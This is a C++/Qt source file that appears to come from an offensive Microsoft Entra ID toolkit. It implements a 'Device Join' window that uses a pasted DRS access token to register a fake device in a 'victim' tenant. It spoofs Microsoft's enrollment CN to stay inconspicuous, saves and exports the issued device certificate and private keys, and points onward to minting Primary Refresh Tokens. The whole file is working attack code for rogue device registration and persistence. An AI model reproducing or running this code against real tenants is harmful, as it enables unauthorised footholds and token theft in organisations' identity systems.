#include "DeviceJoinWindow.h"
#include "NetworkHelper.h"
#include "StyleManager.h"
#include "../shared/DeviceCryptoHelper.h"
#include "../shared/DeviceStore.h"

#include <QApplication>
#include <QDateTime>
#include <QFileDialog>
#include <QFormLayout>
#include <QGroupBox>
#include <QHBoxLayout>
#include <QHeaderView>
#include <QJsonArray>
#include <QJsonDocument>
#include <QJsonObject>
#include <QLabel>
#include <QMessageBox>

namespace {

// Constant CN Microsoft's own client uses for DRS enrollment. Some
// implementations put the user objectId instead; the endpoint accepts
// either. Using the well-known GUID keeps our fingerprint neutral.
const QString kEnrollmentCn = QStringLiteral("7E980AD9-B86D-4306-9425-9AC066FB014A");

// DRS enrollment endpoint - api-version=1.0 returns JSON.
const QString kDrsEnrollUrl =
    QStringLiteral("https://enterpriseregistration.windows.net/EnrollmentServer/device/?api-version=1.0");

}  // namespace

DeviceJoinWindow::DeviceJoinWindow(QWidget *parent)
    : EnumerationWindowBase(parent)
{
    setWindowTitle("Device Join (DRS)");
    setupUi();
    refreshStoredList();
}

void DeviceJoinWindow::setupUi() {
    setupBaseUi(
        "DRS Access Token",
        "Paste access token with audience urn:ms-drs:enterpriseregistration.windows.net",
        "How to obtain: run device-code login using client-id "
        "01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 (Device Registration Client) "
        "and resource urn:ms-drs:enterpriseregistration.windows.net.");

    // We aren't calling Graph here - update the auto-fetch target so the
    // toolbar's Auto-Fetch button, if used, would surface the right audience.
    setTargetResource(QStringLiteral("urn:ms-drs:enterpriseregistration.windows.net"));

    // Device details
    auto *detailsGroup = new QGroupBox("Fake Device Details", this);
    auto *form = new QFormLayout(detailsGroup);
    displayNameInput = new QLineEdit(this);
    displayNameInput->setPlaceholderText("e.g. LAB-DESKTOP-01");
    displayNameInput->setText(QString("ANIMO-%1")
                                  .arg(QDateTime::currentDateTime().toString("yyyyMMdd-hhmm")));
    osVersionInput = new QLineEdit(this);
    osVersionInput->setText("10.0.19045.0");
    tenantDomainInput = new QLineEdit(this);
    tenantDomainInput->setPlaceholderText("victim.onmicrosoft.com  (or custom domain)");
    deviceTypeCombo = new QComboBox(this);
    deviceTypeCombo->addItems({ "Windows", "MacOS", "iOS", "Android" });
    joinTypeCombo = new QComboBox(this);
    joinTypeCombo->addItem("Azure AD Joined (JoinType=0)", 0);
    joinTypeCombo->addItem("Registered   (JoinType=4)",    4);

    form->addRow("Display name:", displayNameInput);
    form->addRow("OS version:",   osVersionInput);
    form->addRow("Tenant domain:", tenantDomainInput);
    form->addRow("Device type:",  deviceTypeCombo);
    form->addRow("Join type:",    joinTypeCombo);
    mainLayout->addWidget(detailsGroup);

    // Actions
    auto *actionsRow = new QHBoxLayout();
    joinBtn = new QPushButton("Join Device", this);
    StyleManager::applySuccessStyle(joinBtn);
    refreshBtn    = new QPushButton("Refresh Stored", this);
    removeBtn     = new QPushButton("Remove Selected", this);
    StyleManager::applyDangerStyle(removeBtn);
    exportCertBtn = new QPushButton("Export Cert (PEM)", this);
    exportKeyBtn  = new QPushButton("Export Key (PEM)",  this);
    actionsRow->addWidget(joinBtn);
    actionsRow->addStretch();
    actionsRow->addWidget(exportCertBtn);
    actionsRow->addWidget(exportKeyBtn);
    actionsRow->addWidget(refreshBtn);
    actionsRow->addWidget(removeBtn);
    mainLayout->addLayout(actionsRow);

    // Join summary panel
    joinSummary = new QPlainTextEdit(this);
    joinSummary->setReadOnly(true);
    joinSummary->setPlaceholderText("Join result appears here (deviceId, cert thumbprint, etc.)");
    joinSummary->setMaximumHeight(140);
    mainLayout->addWidget(joinSummary);

    // Stored devices table
    auto *storedGroup = new QGroupBox("Stored Devices  (data/device_certs.dat)", this);
    auto *storedLayout = new QVBoxLayout(storedGroup);
    storedTable = new QTableWidget(this);
    storedTable->setColumnCount(5);
    storedTable->setHorizontalHeaderLabels({ "DeviceId", "Display Name", "Tenant", "Thumbprint (SHA256)", "Joined" });
    storedTable->horizontalHeader()->setSectionResizeMode(QHeaderView::ResizeToContents);
    storedTable->horizontalHeader()->setStretchLastSection(true);
    storedTable->setSelectionBehavior(QAbstractItemView::SelectRows);
    storedTable->setSelectionMode(QAbstractItemView::SingleSelection);
    storedTable->setAlternatingRowColors(true);
    storedTable->setEditTriggers(QAbstractItemView::NoEditTriggers);
    storedLayout->addWidget(storedTable);
    mainLayout->addWidget(storedGroup, 1);

    setupBottomUi();

    connect(joinBtn,       &QPushButton::clicked, this, &DeviceJoinWindow::performJoin);
    connect(refreshBtn,    &QPushButton::clicked, this, &DeviceJoinWindow::refreshStoredList);
    connect(removeBtn,     &QPushButton::clicked, this, &DeviceJoinWindow::removeSelected);
    connect(exportCertBtn, &QPushButton::clicked, this, &DeviceJoinWindow::exportSelectedCert);
    connect(exportKeyBtn,  &QPushButton::clicked, this, &DeviceJoinWindow::exportSelectedKey);

    resize(1050, 780);
}

QList<QPushButton*> DeviceJoinWindow::getOperationButtons() {
    return { joinBtn, refreshBtn, removeBtn, exportCertBtn, exportKeyBtn };
}

void DeviceJoinWindow::onCancelOperation() {}

void DeviceJoinWindow::performJoin() {
    const QString token = getToken();
    if (token.isEmpty()) {
        QMessageBox::warning(this, "Missing Token", "Paste a DRS-audience access token first.");
        return;
    }
    const QString displayName = displayNameInput->text().trimmed();
    const QString tenantDomain = tenantDomainInput->text().trimmed();
    if (displayName.isEmpty() || tenantDomain.isEmpty()) {
        QMessageBox::warning(this, "Missing Fields", "Display name and tenant domain are required.");
        return;
    }

    logInfo(QString("Generating RSA-2048 keypair for '%1'...").arg(displayName));
    auto devKp   = DeviceCryptoHelper::generateRsa2048();
    auto transKp = DeviceCryptoHelper::generateRsa2048();
    if (!devKp.success || !transKp.success) {
        logError(QString("Keygen failed: %1").arg(devKp.errorMessage.isEmpty()
                                                     ? transKp.errorMessage : devKp.errorMessage));
        return;
    }

    QString csrErr;
    const QByteArray csrPem = DeviceCryptoHelper::buildCsr(devKp.privateKeyPem, kEnrollmentCn, &csrErr);
    if (csrPem.isEmpty()) { logError(QString("CSR build failed: %1").arg(csrErr)); return; }
    const QByteArray csrBase64 = DeviceCryptoHelper::csrPemToDrsBase64(csrPem);

    // Transport pubkey - the raw base64 SubjectPublicKeyInfo (strip PEM
    // armor, same convention DRS accepts).
    const QByteArray transportPubB64 = DeviceCryptoHelper::csrPemToDrsBase64(transKp.publicKeyPem);

    QJsonObject certReq{ { "Type", "pkcs10" }, { "Data", QString::fromLatin1(csrBase64) } };
    QJsonObject attrs{ { "ReuseDevice", "true" }, { "ReturnClientSideCa", "true" } };
    QJsonObject body{
        { "CertificateRequest",  certReq },
        { "TransportKey",        QString::fromLatin1(transportPubB64) },
        { "TargetDomain",        tenantDomain },
        { "DeviceType",          deviceTypeCombo->currentText() },
        { "OSVersion",           osVersionInput->text().trimmed() },
        { "DeviceDisplayName",   displayName },
        { "JoinType",            joinTypeCombo->currentData().toInt() },
        { "attributes",          attrs },
    };

    setLoading(true);
    logInfo("Submitting DRS enrollment...");

    QNetworkRequest req = createBearerRequest(kDrsEnrollUrl, token, 30000);
    QNetworkReply *reply = net->post(req, QJsonDocument(body).toJson(QJsonDocument::Compact));
    if (!reply) { logError("Failed to issue enroll POST"); setLoading(false); return; }
    trackReply(reply);
    connect(reply, &QNetworkReply::finished, this,
            [this, reply, devKpPriv=devKp.privateKeyPem, transKpPriv=transKp.privateKeyPem,
             displayName, tenantDomain]() {
        untrackReply(reply);
        reply->deleteLater();
        setLoading(false);

        QString err;
        if (!NetworkHelper::isReplySuccess(reply, &err)) {
            logError(QString("DRS enrollment failed: %1").arg(NetworkHelper::parseApiError(reply)));
            return;
        }
        const QJsonObject resp = QJsonDocument::fromJson(reply->readAll()).object();

        // Response shape (v1.0 JSON):
        //   { Certificate: { RawBody: "<b64 DER cert>" },
        //     User:        { Upn, Uid },
        //     MembershipChanges: [ ... ],
        //     ... }
        const QString certB64 = resp.value("Certificate").toObject().value("RawBody").toString();
        if (certB64.isEmpty()) {
            logError("DRS response missing Certificate.RawBody - unexpected schema.");
            joinSummary->setPlainText(QJsonDocument(resp).toJson(QJsonDocument::Indented));
            return;
        }

        // Wrap the returned DER into a PEM block so the store's cert
        // parser (SHA256 thumbprint) can read it directly.
        QByteArray certPem = "-----BEGIN CERTIFICATE-----\n";
        for (int i = 0; i < certB64.size(); i += 64) certPem += certB64.mid(i, 64).toLatin1() + '\n';
        certPem += "-----END CERTIFICATE-----\n";

        const QString thumbprint = DeviceCryptoHelper::certSha256Thumbprint(certPem);

        // deviceId is the CN of the returned cert (per DRS spec) OR present
        // in resp.MembershipChanges - try both, prefer whichever is present.
        QString deviceId;
        const QJsonArray changes = resp.value("MembershipChanges").toArray();
        for (const QJsonValue &v : changes) {
            const QString id = v.toObject().value("LocalSID").toString();
            if (!id.isEmpty()) { deviceId = id; break; }
        }
        if (deviceId.isEmpty()) deviceId = resp.value("User").toObject().value("Uid").toString();
        if (deviceId.isEmpty()) deviceId = thumbprint.left(32);  // Last-resort placeholder.

        DeviceStore::Device dev;
        dev.deviceId        = deviceId;
        dev.tenantId        = tenantDomain;
        dev.displayName     = displayName;
        dev.certThumbprint  = thumbprint;
        dev.joinedAt        = QDateTime::currentDateTimeUtc();
        dev.privateKeyPem   = devKpPriv;
        dev.deviceCertPem   = certPem;
        dev.transportKeyPem = transKpPriv;

        if (!DeviceStore::instance().saveDevice(dev)) {
            logError("Persist to DeviceStore failed - device joined but not saved locally.");
        } else {
            logSuccess(QString("Joined and persisted. deviceId=%1  thumbprint=%2")
                           .arg(deviceId, thumbprint));
        }

        joinSummary->setPlainText(QString(
            "SUCCESS\n"
            "  DeviceId:    %1\n"
            "  Thumbprint:  %2\n"
            "  Tenant:      %3\n"
            "  Display:     %4\n"
            "  Stored at:   data/device_certs.dat  (encrypted at rest)\n\n"
            "Next steps for cert-based PRT mint are documented in [4.8].")
                .arg(deviceId, thumbprint, tenantDomain, displayName));

        refreshStoredList();
    });
}

void DeviceJoinWindow::refreshStoredList() {
    const auto devices = DeviceStore::instance().loadDevices();
    storedTable->setRowCount(0);
    for (const auto &d : devices) {
        const int row = storedTable->rowCount();
        storedTable->insertRow(row);
        storedTable->setItem(row, 0, new QTableWidgetItem(d.deviceId));
        storedTable->setItem(row, 1, new QTableWidgetItem(d.displayName));
        storedTable->setItem(row, 2, new QTableWidgetItem(d.tenantId));
        storedTable->setItem(row, 3, new QTableWidgetItem(d.certThumbprint));
        storedTable->setItem(row, 4, new QTableWidgetItem(d.joinedAt.toString(Qt::ISODate)));
    }
}

void DeviceJoinWindow::removeSelected() {
    const int row = storedTable->currentRow();
    if (row < 0) return;
    const QString deviceId = storedTable->item(row, 0)->text();
    const auto btn = QMessageBox::question(
        this, "Confirm Remove",
        QString("Remove this device from local storage?\n\n  deviceId: %1\n\n"
                "The entry in Entra is not affected - use the tenant Admin Center "
                "if you want to remove it there too.").arg(deviceId));
    if (btn != QMessageBox::Yes) return;
    if (DeviceStore::instance().removeDevice(deviceId)) {
        logInfo(QString("Removed local record for %1").arg(deviceId));
        refreshStoredList();
    } else {
        logError("Remove failed.");
    }
}

void DeviceJoinWindow::exportSelectedCert() {
    const int row = storedTable->currentRow();
    if (row < 0) { QMessageBox::warning(this, "No Selection", "Select a device first."); return; }
    const QString deviceId = storedTable->item(row, 0)->text();
    const auto dev = DeviceStore::instance().findByDeviceId(deviceId);
    if (dev.deviceCertPem.isEmpty()) { logError("Selected device has no stored cert."); return; }
    const QString path = QFileDialog::getSaveFileName(
        this, "Export Cert", QString("%1.cert.pem").arg(deviceId), "PEM (*.pem)");
    if (path.isEmpty()) return;
    QFile f(path);
    if (!f.open(QIODevice::WriteOnly)) { logError(f.errorString()); return; }
    f.write(dev.deviceCertPem);
    logSuccess(QString("Wrote %1 bytes to %2").arg(dev.deviceCertPem.size()).arg(path));
}

void DeviceJoinWindow::exportSelectedKey() {
    const int row = storedTable->currentRow();
    if (row < 0) { QMessageBox::warning(this, "No Selection", "Select a device first."); return; }
    const QString deviceId = storedTable->item(row, 0)->text();
    const auto btn = QMessageBox::warning(
        this, "Confirm Export",
        "This writes the device PRIVATE KEY in cleartext PEM to disk.\n"
        "Anyone with the file can impersonate this device.\n\nContinue?",
        QMessageBox::Yes | QMessageBox::Cancel, QMessageBox::Cancel);
    if (btn != QMessageBox::Yes) return;
    const auto dev = DeviceStore::instance().findByDeviceId(deviceId);
    if (dev.privateKeyPem.isEmpty()) { logError("Selected device has no stored private key."); return; }
    const QString path = QFileDialog::getSaveFileName(
        this, "Export Key", QString("%1.key.pem").arg(deviceId), "PEM (*.pem)");
    if (path.isEmpty()) return;
    QFile f(path);
    if (!f.open(QIODevice::WriteOnly)) { logError(f.errorString()); return; }
    f.write(dev.privateKeyPem);
    logSuccess(QString("Wrote %1 bytes to %2").arg(dev.privateKeyPem.size()).arg(path));
}
